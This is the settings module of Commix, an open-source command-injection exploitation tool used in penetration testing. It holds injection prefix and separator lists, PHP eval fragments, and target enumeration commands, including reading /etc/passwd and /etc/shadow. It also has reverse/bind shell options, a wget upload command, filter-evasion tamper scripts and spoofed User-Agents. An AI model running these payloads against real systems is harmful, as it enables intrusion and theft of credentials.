#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (http://commixproject.com).
Copyright (c) 2014-2017 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import errno
import urllib
import socket
import random
from socket import error as socket_error

if "--disable-coloring" in sys.argv:
  from src.utils import colors
  colors.ENABLE_COLORING = False

from src.thirdparty.colorama import Fore, Back, Style, init

# Status Signs
SUCCESS_SIGN =  "[" + Fore.GREEN + Style.BRIGHT + "+" + Style.RESET_ALL + "] "
INFO_SIGN =  Style.RESET_ALL + "[" + Fore.BLUE + Style.BRIGHT + "*" + Style.RESET_ALL + "] "
QUESTION_SIGN =  Style.RESET_ALL + "[" + Style.BRIGHT + Fore.MAGENTA + "?" + Style.RESET_ALL + "] "
WARNING_SIGN =  "[" + Fore.YELLOW  + "!" + Style.RESET_ALL + "] " + Fore.YELLOW + "Warning: "
WARNING_BOLD_SIGN =  "[" + Style.BRIGHT + Fore.YELLOW  + "!" + Style.RESET_ALL + "] " + Style.BRIGHT + Fore.YELLOW + "Warning: "
ERROR_SIGN =  "[" + Fore.RED + Style.BRIGHT + "x" + Style.RESET_ALL  + "] " + Fore.RED + "Error: "
CRITICAL_SIGN =  Back.RED + "[x] Critical: "
PAYLOAD_SIGN =  "    |_ " + Fore.CYAN
TRAFFIC_SIGN =  "    |_ " + Back.MAGENTA
HTTP_CONTENT_SIGN = Fore.MAGENTA
CHECK_SIGN =  "[" + Fore.BLUE + Style.BRIGHT + "*" + Style.RESET_ALL  + "] " + "Checking "
SUB_CONTENT_SIGN =  "    [" + Fore.GREY + Style.BRIGHT + "~" + Style.RESET_ALL  + "] "
ABORTION_SIGN =  ERROR_SIGN 

# Print error message
def print_error_msg(err_msg):
  result = ERROR_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print critical error message
def print_critical_msg(err_msg):
  result = CRITICAL_SIGN + str(err_msg) + Style.RESET_ALL
  return result

# Print abortion message
def print_abort_msg(abort_msg):
  result = ABORTION_SIGN + str(abort_msg) + Style.RESET_ALL
  return result

# Print warning message
def print_warning_msg(warn_msg):
  result = WARNING_SIGN + str(warn_msg)  + Style.RESET_ALL
  return result

# Print warning message
def print_bold_warning_msg(warn_msg):
  result = WARNING_BOLD_SIGN + str(warn_msg)  + Style.RESET_ALL
  return result

# Print information message
def print_info_msg(info_msg):
  result = INFO_SIGN + str(info_msg) + Style.RESET_ALL
  return result

# Print success message
def print_success_msg(success_msg):
  result = SUCCESS_SIGN + Style.BRIGHT + str(success_msg) + Style.RESET_ALL
  return result

# Print payload (verbose mode)
def print_payload(payload):
  result = PAYLOAD_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print HTTP traffic (verbose mode)
def print_traffic(traffic):
  result = TRAFFIC_SIGN + str(traffic) + Style.RESET_ALL
  return result

# Print HTTP response content (verbose mode)
def print_http_response_content(content):
  result = HTTP_CONTENT_SIGN + str(content) + Style.RESET_ALL
  return result

# Print checking message (verbose mode)
def print_checking_msg(payload):
  result = CHECK_SIGN + str(payload) + Style.RESET_ALL
  return result

# Print question message
def print_question_msg(question_msg):
  result = QUESTION_SIGN + question_msg 
  return result

"""
The global variables.
"""
# About
APPLICATION = "commix"
DESCRIPTION_FULL = "Automated All-in-One OS Command Injection and Exploitation Tool"
DESCRIPTION = "The command injection exploiter"
AUTHOR  = "Anastasios Stasinopoulos"
VERSION_NUM = "2.2.39"
STABLE_VERSION = False
if STABLE_VERSION:
  VERSION = "v" + VERSION_NUM[:3] + "-stable"
else:
  VERSION = "v" + VERSION_NUM[:3] + "-dev#" + VERSION_NUM[4:]
YEAR = "2014-2017"
AUTHOR_TWITTER = "@ancst" 
APPLICATION_URL = "http://commixproject.com" 
APPLICATION_TWITTER = "@commixproject" 

# Default User-Agent
DEFAULT_USER_AGENT = APPLICATION + "/" + VERSION + " (" + APPLICATION_URL + ")"

# Inject Tag
INJECT_TAG = "INJECT_HERE"

# User-defined stored post data.
USER_DEFINED_POST_DATA = ""

# The wildcard character
WILDCARD_CHAR = "*"

# Testable parameter(s) - comma separated. 
TEST_PARAMETER = ""

# Skip testing for given parameter(s) - comma separated. 
SKIP_PARAMETER = ""

# Default target host OS (Unix-like)
TARGET_OS = "unix"

# Verbosity level: 0-1 (default 0)
VERBOSITY_LEVEL = 0

# Local HTTP server ip
LOCAL_HTTP_IP = ""

# Local HTTP server port
LOCAL_HTTP_PORT = random.randint(50000,60000)

# Detection / Exploitation phase(s)
DETECTION_PHASE = False
EXPLOITATION_PHASE = False

# Exploitation techniques states
CLASSIC_STATE = False
EVAL_BASED_STATE = False
TIME_BASED_STATE = False
FILE_BASED_STATE = False
TEMPFILE_BASED_STATE = False
TIME_RELATIVE_ATTACK = False

# Stored applied techniques
SESSION_APPLIED_TECHNIQUES = ""

# Check if OS is Windows.
IS_WINDOWS = hasattr(sys, "getwindowsversion")

# Git URL.
GIT_URL = "https://github.com/commixproject/" + APPLICATION + ".git"

# Output Directory
OUTPUT_DIR = ".output/"  

# Output file name
OUTPUT_FILE_NAME = "logs"

# Output file name
OUTPUT_FILE_EXT = ".txt"
OUTPUT_FILE = OUTPUT_FILE_NAME + OUTPUT_FILE_EXT

# Max Length.
MAXLEN = "10000"

# Slow target response.
SLOW_TARGET_RESPONSE = 3

# The testable parameter.
TESTABLE_PARAMETER = "" 

# The HTTP header name.
HTTP_HEADER = ""

# The command injection prefixes.
PREFIXES = ["", " ", "'", "\"", "&", "%26", "|", "%7C", "%27", "%22", "'%26"]

# The command injection separators.
SEPARATORS = ["", ";", "%3B", "&", "%26", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a"]

# The command injection suffixes.
SUFFIXES = ["", "'", "\"", "#", "//", "\\\\", "&&", "%26%26", "%26'", "|", "%7C", "%27", "%22", "%5C%5C", "%2F%2F"]

# Bad combination of prefix and separator
JUNK_COMBINATION = ["&&&", "|||", "|&&", "&|", "&;", "|;", "%7C;", "%26;", "%7C&"]

# Execution functions
EXECUTION_FUNCTIONS = ["exec", "system", "shell_exec", "passthru", "proc_open", "popen"]

# The code injection prefixes.
EVAL_PREFIXES = ["", "{${", ";", "'", ")", "')", "\")", "\".", "'.", ");}", "');}", "\");}"]

# The code injection separators.
EVAL_SEPARATORS = ["", "%0a", "\\\\n"]

# The code injection suffixes.
EVAL_SUFFIXES = ["", "}}","\\\\", "//", "#", ".\"", ".'", ")}"]

# The white-spaces
WHITESPACE = [" "]

# Seconds to delay between each HTTP request.
DELAY = 0

# Seconds to delay the OS response. (Default 1)
TIMESEC = 1

#Level (Default: 1)
DEFAULT_INJECTION_LEVEL = 1
COOKIE_INJECTION_LEVEL = 2
HTTP_HEADER_INJECTION_LEVEL = 3
PERFORM_BASIC_SCANS = True

# Default Temp Directory
TMP_PATH = ""

# Default Server's Web-Root Directory
WEB_ROOT = ""
DEFAULT_WEB_ROOT = ""
CUSTOM_WEB_ROOT = False

# The max help option length.
MAX_OPTION_LENGTH = 18

# Python version.
PYTHON_VERSION = sys.version.split()[0]

# Enumeration Commands
# Output PowerShell's version number
PS_VERSION = "powershell.exe -InputFormat none write-host ([string]$(cmd /c powershell.exe -InputFormat none get-host)[3]).replace('Version','').replace(' ','').substring(1,3)"

# Current user
CURRENT_USER = "whoami"
WIN_CURRENT_USER = "echo %username%"

# The hostname
HOSTNAME = "hostname"
WIN_HOSTNAME = "echo %computername%"

# Check if current user is root
IS_ROOT = "echo $(id -u)"
# Check if current user is admin
IS_ADMIN = "powershell.exe -InputFormat none [Security.Principal.WindowsBuiltinRole]::Administrator"

# Operation System.
RECOGNISE_OS = "uname -s"
WIN_RECOGNISE_OS = "ver"

# Distribution Description / Release 
DISTRO_INFO = "echo $(lsb_release -sir)"

# Hardware platform.
RECOGNISE_HP = "uname -m"
WIN_RECOGNISE_HP = "echo %PROCESSOR_ARCHITECTURE%"

# File System access options
# Read file
FILE_READ = "cat "
WIN_FILE_READ = "type "

# Write file
FILE_WRITE = "echo "

# Write file
FILE_UPLOAD = "wget "

# /etc/passwd
PASSWD_FILE = "/etc/passwd"

SYS_USERS = "awk -F ':' '{print $1}{print $3}{print $6}' " + PASSWD_FILE 
EVAL_SYS_USERS = "awk -F ':' '{print \$1}{print \$3}{print \$6}' " + PASSWD_FILE 

# Exports users of localgroup
WIN_SYS_USERS = "powershell.exe -InputFormat none write-host (([string]$(net user)[4..($(net user).length-3)])"

# /etc/shadow
SHADOW_FILE = "/etc/shadow"
SYS_PASSES = FILE_READ + SHADOW_FILE 

# Accepts 'YES','YE','Y','yes','ye','y'
CHOICE_YES = ['yes','ye','y']

# Accepts 'NO','N','no','n'
CHOICE_NO = ['no','n']

# Accepts 'QUIT','Q','quit','q'
CHOICE_QUIT = ['q','quit']

# Accepts 'W','w','U','u','Q','q'
CHOICE_OS = ['w','u','q']

# Accepts 'C','c','S','s','Q','q','a','A','n','N'
CHOICE_PROCEED = ['c','s','q','a','n']

# Available alternative shells
AVAILABLE_SHELLS = ["python"]

# Available injection techniques.
AVAILABLE_TECHNIQUES = [ "c", "e", "t", "f" ]

SKIP_TECHNIQUES = False

# User Agent List
USER_AGENT_LIST = [
        # Opera
        "Opera/8.0 (X11; Linux i686; U; en)",
        "Opera/9.01 (X11; FreeBSD 6 i386; U; en)"
        "Opera/8.51 (FreeBSD 5.1; U; en)",
        "Opera/8.51 (Macintosh; PPC Mac OS X; U; de)",
        "Opera/9.00 (Macintosh; PPC Mac OS X; U; es)",
        "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
        # Mozilla Firefox
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/31.0",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13 (.NET CLR 3.0.04506.30)",
        "Mozilla/5.0 (X11; Linux i686; rv:21.0) Gecko/20100101 Firefox/21.0",
        "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7",
        "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
        "Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.1.6) Gecko/20091216 Fedora/3.5.6-1.fc11 Firefox/3.5.6 GTB6",
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20130401 Firefox/31.0",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.34 (KHTML, like Gecko) Dooble/1.40 Safari/534.34",
        # Oldies 
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
        "mozilla/3.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/5.0.1",
]

# Mobile User Agents
MOBILE_USER_AGENT_LIST = [
        "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
        "Mozilla/5.0 (Linux; U; Android 2.2; en-US; SGH-T959D Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
        "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320; HP iPAQ h6300)",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3",
        "Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
        "Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344",
]

# Proxy Protocol
PROXY_PROTOCOL = "http"

# Privoxy Proxy
PRIVOXY_IP = "127.0.0.1"
PRIVOXY_PORT = "8118"

# Cookie injection
COOKIE_INJECTION = False

# User-Agent injection
USER_AGENT_INJECTION = None

# Referer injection
REFERER_INJECTION = None

# Custom HTTP Headers injection
CUSTOM_HEADER_INJECTION = False
CUSTOM_HEADER_NAME = "" 

# Valid URL format check
VALID_URL_FORMAT = "https?://(?:www)?(?:[\w-]{2,255}(?:\.\w{2,6}){1,2})(?:/[\w&%?#-]{1,300})?"

# Accepted shell menu options
SHELL_OPTIONS = [
        "?",
        "quit",
        "back",
        "os_shell",
        "reverse_tcp",
        "bind_tcp",
        "set",
]

# Accepted reverse tcp shell menu options
SET_OPTIONS = [
        "LHOST",
        "RHOST",
        "LPORT",
        "SRVPORT",
        "URIPATH",
]

# Cookie delimiter
COOKIE_DELIMITER = ";"

# Split parameter value
PARAMETER_SPLITTING_REGEX = r'[,]'

# Cookie delimiter
PARAMETER_DELIMITER = "&"

# Web-page Charset
CHARSET = ""

# Page default charset
DEFAULT_CHARSET = "utf-8"

# Character Sets List. 
# A complete list of the standard encodings Python supports.
CHARSET_LIST = [
   "ascii",
   "big5",
   "big5hkscs",
   "cp037",
   "cp424",
   "cp437",
   "cp500",
   "cp720",
   "cp737",
   "cp775",
   "cp850",
   "cp852",
   "cp855",
   "cp856",
   "cp857",
   "cp858",
   "cp860",
   "cp861",
   "cp862",
   "cp863",
   "cp864",
   "cp865",
   "cp866",
   "cp869",
   "cp874",
   "cp875",
   "cp932",
   "cp949",
   "cp950",
   "cp1006",
   "cp1026",
   "cp1140",
   "cp1250",
   "cp1251",
   "cp1252",
   "cp1253",
   "cp1254",
   "cp1255",
   "cp1256",
   "cp1257",
   "cp1258",
   "euc-jp",
   "euc-jis-2004",
   "euc-jisx0213",
   "euc-kr",
   "gb2312",
   "gbk",
   "gb18030",
   "hz",
   "iso2022-jp",
   "iso2022-jp-1",
   "iso2022-jp-2",
   "iso2022-jp-2004",
   "iso2022-jp-3",
   "iso2022-jp-ext",
   "iso2022-kr",
   "latin-1",
   "iso8859-2",
   "iso8859-3",
   "iso8859-4",
   "iso8859-5",
   "iso8859-6",
   "iso8859-7",
   "iso8859-8",
   "iso8859-9",
   "iso8859-10",
   "iso8859-13",
   "iso8859-14",
   "iso8859-15",
   "iso8859-16",
   "johab",
   "koi8-r",
   "koi8-u",
   "mac-cyrillic",
   "mac-greek",
   "mac-iceland",
   "mac-latin2",
   "mac-roman",
   "mac-turkish",
   "ptcp154",
   "shift-jis",
   "shift-jis-2004",
   "shift-jisx0213",
   "utf-32",
   "utf-32-be",
   "utf-32-le",
   "utf-16",
   "utf-16-be",
   "utf-16-le",
   "utf-7",
   "utf-8",
   "utf-8-sig"
 ]

# Default server banner
SERVER_BANNER = ""

# Server banners list
SERVER_BANNERS = [
    "Microsoft-IIS",
    "Apache",
    "Nginx"
]

# Server banners list
SERVER_OS_BANNERS = [
    "microsoft",
    "win",
    "debian",
    "ubuntu",
    "fedora",
    "centos",
    "freebsd",
    "unix"
]

TARGET_APPLICATION = ""
# Unsupported target application(s) [1]
# [1] https://github.com/commixproject/commix/wiki/Target-applications
UNSUPPORTED_TARGET_APPLICATION = [ 
    ""
]

REVERSE_TCP = False
BIND_TCP = False

# Injection logs report
SHOW_LOGS_MSG = False

# Enumeration options
ENUMERATION_DONE = False
ENUMERATE_AGAIN = False

# FIle access options
FILE_ACCESS_DONE = False
FILE_ACCESS_AGAIN = False

# JSON Data
IS_JSON = False

# JSON Symbols
JSON_RECOGNITION_REGEX = r'(?s)\A(\s*\[)*\s*\{.*"[^"]+"\s*:\s*("[^"]+"|\d+).*\}\s*(\]\s*)*\Z'

# Base64 format recognition
BASE64_RECOGNITION_REGEX = r'^[A-Za-z0-9+/]+[=]{0,2}$'

# Hex encoded characters recognition
HEX_RECOGNITION_REGEX = r'^[0-9a-f]+'

# GET parameters recognition
GET_PARAMETERS_REGEX = r"(.*?)\?(.+)"

# TFB Decimal
TFB_DECIMAL = False

# Ignore Error Message
IGNORE_ERR_MSG = False

# Windows Python (2.7) installed directory.
WIN_PYTHON_DIR = "C:\\Python27\\python.exe"
USER_DEFINED_PYTHON_DIR = False

# Windows PHP installed directory.
WIN_PHP_DIR = "C:\\xampp\\php\\php.exe"
USER_DEFINED_PHP_DIR = False

# Comment out
WIN_COMMENT = "REM"
COMMENT = "#"

#Delete command
WIN_DEL = "DEL "
DEL = "rm "

# Time-based Variables
FOUND_HOW_LONG = "" 
FOUND_DIFF = ""

# Check for PowerShell
PS_ENABLED = None

# ANSI colors removal
ANSI_COLOR_REMOVAL = r'\x1b[^m]*m'

# Default LHOST / LPORT / RHOST setup, 
# for the reverse TCP connection
LHOST = ""
LPORT = ""
# for the bind TCP connection
RHOST = ""
# Default settings (web_delivery).
URIPATH = "/"
SRVPORT = 8080

# Maybe a WAF/IPS/IDS protection.
WAF_ENABLED = False

# Session Handler
SESSION_FILE = ""
LOAD_SESSION = None

# Retest all techniques
RETEST = False

# Define the default credentials files
USERNAMES_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "usernames.txt"
PASSWORDS_TXT_FILE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "passwords_john.txt"

REQUIRED_AUTHENTICATION = False

INJECTED_HTTP_HEADER = False
INJECTION_CHECKER = False

# List of pages / scripts potentially vulnerable to Shellshock
CGI_SCRIPTS = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/" + "shocker-cgi_list.txt"

# Metasploit Framework Path
METASPLOIT_PATH = "/usr/share/metasploit-framework/"

# Supported HTTP Authentication types
SUPPORTED_HTTP_AUTH_TYPES = [ "basic", "digest" ]

# HTTP Headers
HTTP_HEADERS = [ "user-agent", "referer" ]

# Tamper scripts dict
TAMPER_SCRIPTS = {
                  "space2ifs": False,
                  "base64encode": False,
                  "hexencode": False,
                  "space2plus": False,
                  "space2htab": False,
                  "space2vtab": False
                 }

# HTTP Errors
BAD_REQUEST = "400"
UNAUTHORIZED_ERROR = "401"
FORBIDDEN_ERROR = "403"
NOT_FOUND_ERROR = "404"
NOT_ACCEPTABLE_ERROR = "406"
INTERNAL_SERVER_ERROR = "500"

# End line
END_LINE = ["\r", "\n", "\r\n"]

# Check for updates on start up.
CHECK_FOR_UPDATES_ON_START = True

# Skip the mathematic calculation (Detection Phase)
SKIP_CALC = False

USE_BACKTICKS = False

METASPLOIT_ERROR_MSG =  "You need to have Metasploit installed. "
METASPLOIT_ERROR_MSG += "Please ensure Metasploit is installed in the right path."

# Target URL reload
URL_RELOAD = False

# Crawl the website starting from the target URL.
DEFAULT_CRAWLDEPTH_LEVEL = 0

# Command history
CLI_HISTORY = ""

# Check for multi encoded payloads
MULTI_ENCODED_PAYLOAD = []

# Retries when the connection timeouts (Default: 3).
MAX_RETRIES = 3

# End of file
EOF = False

# Init Test
INIT_TEST = ""

# Check Tor again
TOR_CHECK_AGAIN = True

# URL for checking internet connection.
CHECK_INTERNET_ADDRESS = "ipinfo.io/"

# Check internet connection.
CHECK_INTERNET = False

#eof
